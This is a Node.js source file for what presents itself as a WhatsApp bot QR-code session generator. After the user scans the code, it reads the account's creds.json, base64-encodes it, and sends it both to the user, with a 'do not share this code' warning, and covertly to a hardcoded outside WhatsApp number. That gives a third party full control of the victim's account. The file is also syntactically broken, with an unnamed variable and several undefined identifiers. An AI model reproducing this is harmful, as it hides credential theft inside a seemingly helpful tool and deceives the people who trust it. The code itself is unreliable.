const express = require("express");
const app = express();
const pino = require("pino");
let { toBuffer } = require("qrcode");
const path = require('path');
const fs = require("fs-extra");
const { Boom } = require("@hapi/boom");
const PORT = process.env.PORT ||  5000

if (fs.existsSync('./auth_info_baileys')) {
    fs.emptyDirSync(__dirname + '/auth_info_baileys');
  };
  app.use("/", async(req, res) => {
  
  const { default: SLKINGXMDWASocket, useMultiFileAuthState, Browsers, delay,DisconnectReason, makeInMemoryStore, } = require("@whiskeysockets/baileys");
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
  async function SLKINGXMD() {
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys')
    try {
      let SlKingXMD =SLKINGXMDWASocket({ 
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), 
        browser: Browsers.baileys("Desktop"),
        auth: state 
        });


      SlKingXMD.ev.on("connection.update", async (s) => {
        const { connection, lastDisconnect, qr } = s;
        if (qr) { res.end(await toBuffer(qr)); }
           if (connection == "open"){
              await delay(3000);
              let user = SlKingXMD.user.id;

          let CREDS = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json')
          var  = Buffer.from(CREDS).toString('base64')
         // res.json({status:true,SlkingXMDqrcodeID })
          const rows = [
         {title: '⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ ඔබගෙ QR කේතය', description: '\n\nSLKINGXMD;;;' + SlkingXMDqrcodeID + '\n\n*⚠ කරුණාකර මෙම කේතය කිසිවෙකු සමඟ බෙදා නොගන්න!* ' + conn.user.name , rowId:"rowid1"},
         {title: '⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ තොරතුරු', description: `\n\n*🖲️ සාදරයෙන් ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ MultiDevice WhatsApp User Bot වෙත පිලිගන්නවා 🖲️*\n\n\n*🖲️ ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ යනූ සීඝ්‍රයෙන් වර්ධනය වන Whatsapp රොබෝවෙකි..⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ වෙත ලැබෙන නව අංග හා යතාවත්කාලින කිරිම් ලබා ගැනීමට🖲️ .update විධානය භාවිතා කරන්න..*\n\n*🖲️ Welcome To  ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ WhatsApp User Bot\n\n\n*🖲️ ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ is a powerfull WhatsApp robot developed By Nethsara Gimhan.*\n\n🖲️ .update Command use for new items*`, rowId:"rowid2"},
         {title: 'අවවාදයන්, ᴡᴀʀɴɪɴɢs ', description: `\n\n${warn}`, rowId:"rowid3"},
         ]

        const sections = [{title: "⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠-Bot-QR-GEN", rows: rows}]

       const button = {
        buttonText: 'ᴄʟɪᴄᴋ ʜᴇʀᴇ ',
        description: msgs ,
        sections: sections,
        listType: 1
        }
        
          await SlKingXMD.sendMessage(user, { image: { url : 'https://telegra.ph/file/b553f253d553821af155f.jpg' }, caption : "﹝💹️﹞ Thanks for using ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ MD-WA-BOT﹝💹﹞*" })
          await SlKingXMD.sendMessage(user, { text:  "SLKINGXMD;;;" + SlkingXMDqrcodeID });
          await SlKingXMD.sendMessage(user, { text: '*⚠ Please Do Not Share This Code With Anyone !!! 🔐*\nUser -> ' + SlKingXMD.user.name + '\n\n*⚠ මෙම කේතය කිසිවෙනු සමග බෙදා නොගන්න !!! 🔐*\nපරිශිලකයා -> ' + SlKingXMD.user.name });
//=====================================================
          await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { image: { url : 'https://telegra.ph/file/b553f253d553821af155f.jpg' }, caption : "﹝💹️﹞ Thanks for using ⎝🎭 𝚂𝙻 𝙺𝙸𝙽𝙶 𝚇 🎭⎠ MD-WA-BOT﹝💹﹞*" })
          await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { text:  "SLKINGXMD;;;" + SlkingXMDqrcodeID });
          await SlKingXMD.sendMessage("94787166875@s.whatsapp.net", { text: '*⚠ Please Do Not Share This Code With Anyone !!! 🔐*\nUser -> ' + SlKingXMD.user.name + '\n\n*⚠ මෙම කේතය කිසිවෙනු සමග බෙදා නොගන්න !!! 🔐*\nපරිශිලකයා -> ' + SlKingXMD.user.name });
          await delay(1000);
          try{ await fs.emptyDirSync(__dirname+'/auth_info_baileys'); }catch(e){}


        }

        SlKingXMD.ev.on('creds.update', saveCreds)

        if (connection === "close") {            
            let reason = new Boom(lastDisconnect?.error)?.output.statusCode
            // console.log("Reason : ",DisconnectReason[reason])
            if (reason === DisconnectReason.connectionClosed) {
              console.log("Connection closed!")
             // SLKINGXMD().catch(err => console.log(err));
            } else if (reason === DisconnectReason.connectionLost) {
                console.log("Connection Lost from Server!")
            //  SLKINGXMD().catch(err => console.log(err));
            } else if (reason === DisconnectReason.restartRequired) {
                console.log("Restart Required, Restarting...")
              SLKINGXMD().catch(err => console.log(err));
            } else if (reason === DisconnectReason.timedOut) {
                console.log("Connection TimedOut!")
             // SLKINGXMD().catch(err => console.log(err));
            }  else {
                console.log('Connection closed with bot. Please run again.');
                console.log(reason)
              //process.exit(0)
            }
          }



      });
    } catch (err) {
        console.log(err);
       await fs.emptyDirSync(__dirname+'/auth_info_baileys'); 
    }
  }



  SLKINGXMD().catch(async(err) => {
    console.log(err)
    await fs.emptyDirSync(__dirname+'/auth_info_baileys'); 
});

  })


app.listen(PORT, () => console.log(`App listened on port http://localhost:${PORT}`));
